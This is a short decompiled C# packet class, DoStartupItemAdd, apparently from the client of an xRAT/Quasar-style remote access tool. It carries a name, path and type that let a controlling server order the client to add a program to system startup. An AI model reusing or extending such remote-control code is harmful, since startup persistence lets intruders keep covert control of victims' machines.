using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoStartupItemAdd : GInterface4
{
	public string Name { get; set; }

	public string Path { get; set; }

	public int Type { get; set; }

	public DoStartupItemAdd()
	{
	}

	public DoStartupItemAdd(string name, string path, int type)
	{
		Name = name;
		Path = path;
		Type = type;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
